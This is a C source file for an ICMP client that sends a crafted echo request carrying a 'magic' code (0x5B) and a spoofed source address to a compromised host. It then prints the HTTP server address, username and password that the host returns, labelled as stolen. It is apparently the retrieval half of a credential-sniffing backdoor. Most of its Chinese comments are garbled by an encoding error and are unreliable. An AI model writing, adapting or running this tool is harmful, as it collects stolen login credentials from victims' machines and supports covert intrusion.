
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#ifndef __USE_BSD
# define __USE_BSD             /* We want the proper headers */
#endif

static unsigned short checksum(int numwords, unsigned short *buff)
{
   unsigned long sum;

   for(sum = 0;numwords > 0;numwords--)
     sum += *buff++;   /* add next word, then increment pointer */

   sum = (sum >> 16) + (sum & 0xFFFF);
   sum += (sum >> 16);

   return ~sum;
}

int main(int argc, char *argv[])
{
	/*��������Ҫ����ICMP�����������һ���Ŀռ�*/
    unsigned char dgram[256];          /* Plenty for a PING datagram */
    /* �����ܺ��ߴ������Ļظ�ICMP����buff(���û���������)*/ 
    unsigned char recvbuff[256]; 
    /* ipheadָ��ipͷ�� */ 
    struct ip *iphead = (struct ip *)dgram;
    /* icmpheadָ��icmpͷ�� +sizeof(ip)������ipͷ�� */
    struct icmp *icmphead = (struct icmp *)(dgram + sizeof(struct ip));
    /* Դ��ַ�������й����ߵ�IP��ַ */
    struct sockaddr_in src;
    /* Ŀ�ĵ�ַ�������ܺ��ߵ�IP������IP��ַ��Ҫ��������������ĵ�һ������*/
    struct sockaddr_in addr;
    /* in_addr��sockaddr_in�е�һ���֣����н���IP��ַ������sockaddr_in*/
    struct in_addr my_addr;  //���ǹ�����IP��ַ��������Ҫ��������������ĵڶ�������
    /* �����ܺ��߷��ʵ�����������ĵ�ַ*/
    struct in_addr serv_addr;
    /* Դ��ַ�Ĵ�С */
    socklen_t src_addr_size = sizeof(struct sockaddr_in);
    
    int icmp_sock = 0;  //socket�ļ�������
    /* ������ */
    int one = 1;
    /* ��������ͷ��ָ�� */
    int *ptr_one = &one;
    /* ��û�д�������������ֱ���˳� */
    if (argc < 3) {
    fprintf(stderr, "Usage:  %s remoteIP myIP\n", argv[0]);
    exit(1);
    }

    /* ��ȡһ��socket��Э����õ���ipv4��AF_INET��PF_INET��һ����, SOCK_RAW��ʾ�����Լ�������������ݰ�������ΪICMP���ݰ� */
    /* ������£��������ݰ������ݲ������޸ģ�����Ҫ�޸�IP��ַ�����Կ���ֱ�ӷ�һ����ͨ��socket*/
	if ((icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
    	fprintf(stderr, "Couldn't open raw socket! %s\n",
        strerror(errno));
    	exit(1);
    }

    /* set the HDR_INCL option on the socket����sockѡ�ʹ��ipЭ����������IP_HDRINCL��ʾ�����Լ���������� */
    if(setsockopt(icmp_sock, IPPROTO_IP, IP_HDRINCL, ptr_one, sizeof(one)) < 0) {
    	close(icmp_sock);
    	fprintf(stderr, "Couldn't set HDRINCL option! %s\n",
        strerror(errno));
    	exit(1);
    }
	/*���￪ʼ����ICMP��*/
	/* ��Ŀ�ĵ�ַ��Э�������Ϊipv4*/
    addr.sin_family = AF_INET;
    /*����ʱ�����һ������Ϊ�ܺ��ߵ�IP*/ 
    addr.sin_addr.s_addr = inet_addr(argv[1]);
	/*����ʱ����ڶ�������Ϊ�����ߵ�IP*/ 
    my_addr.s_addr = inet_addr(argv[2]);
	/*��ptrָ����ڴ��ĵ�һ��num�ֽ�����Ϊָ��ֵ*/
	/*��dgram��ʼ��Ϊȫ0*/ 
    memset(dgram, 0x00, 256);
    /*��recvbuff��ʼ��Ϊȫ0*/ 
    memset(recvbuff, 0x00, 256);

    /* Ϊipͷ��������� */
    iphead->ip_hl  = 5;   //4λ ip�ײ����� 
    iphead->ip_v   = 4;  //Э�飺IPV4
    iphead->ip_tos = 0;   //8λ �������� 
    iphead->ip_len = 64;    //   IP���ܳ���>=64:20�ֽ�IPͷ+8�ֽڵ�ICMPͷ+36�ֽ����ݣ������Ų��ᱻwatch_in�����е��жϹ��˵�
    iphead->ip_id  = (unsigned short)rand(); //16λ ���Գ�ʼ��Ϊ0 
    iphead->ip_off = 0; //13λ �ֶ�ƫ�� 
    iphead->ip_ttl = 128; //8λ ����ʱ�� 
    iphead->ip_p   = IPPROTO_ICMP; //8λ icmpЭ�� 
    iphead->ip_sum = 0; //У��ͳ�ʼ��Ϊ0 
    iphead->ip_src = my_addr; //Դ��ַ�������ߵ�IP��������IP
    iphead->ip_dst = addr.sin_addr; //Ŀ�ĵ�ַ���ܺ��ߵ�IP

    /* Ϊicmpͷ��������� */
    icmphead->icmp_type = ICMP_ECHO; //����Ϊicmp�����ģ�����Ϊ8����Ҫ�ܺ��߻ظ�ICMP_REPLY��������Ϊ0�� 
    icmphead->icmp_code = 0x5B; //���ţ�watch_in()���жϵ�icmp_codeһ�� 
    icmphead->icmp_cksum = checksum(1, (unsigned short *)icmphead);//42->44��8+36��icmp��У�����Ҫ����ͷ�������ݲ��� 8�ֽڵ��ײ� �� 36�ֽڵ����ݲ��ʣ����� 

    /* �����ǹ���õİ�����ȥ */
    fprintf(stdout, "Sending request...\n");
    if (sendto(icmp_sock, dgram, 64, 0, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0) {
    	fprintf(stderr, "\nFailed sending request! %s\n",
        strerror(errno));
    	return 0;
    }

    fprintf(stdout, "Waiting for reply...\n");
    if (recvfrom(icmp_sock, recvbuff, 256, 0, (struct sockaddr *)&src, &src_addr_size) < 0) {
    	fprintf(stdout, "Failed getting reply packet! %s\n",
        strerror(errno));
    	close(icmp_sock);
    	exit(1);
    }

    iphead = (struct ip *)recvbuff;
    icmphead = (struct icmp *)(recvbuff + sizeof(struct ip));
    // ����ȡ���İ������ݲ����еķ�������IP��ַ(ռ4�ֽڣ���in_addr�ṹ���С)���Ƶ�serv_addr 
    memcpy(&serv_addr, ((char *)icmphead + 8), sizeof (struct in_addr));  //ICMPͷΪ8�ֽ�

    /*inet_ntoa�������������ַת����.������ַ�����ʽ*/
    fprintf(stdout, "Stolen for htttp server %s:\n", inet_ntoa(serv_addr));
    fprintf(stdout, "Username:    %s\n", (char *)((char *)icmphead + 12));  //12 = 8(ICMPͷ��)+4(IP��ַ����)
    fprintf(stdout, "Password:    %s\n", (char *)((char *)icmphead + 28));   //28 = 12 + 16(�û����ĳ���)

    close(icmp_sock);

    return 0;
}
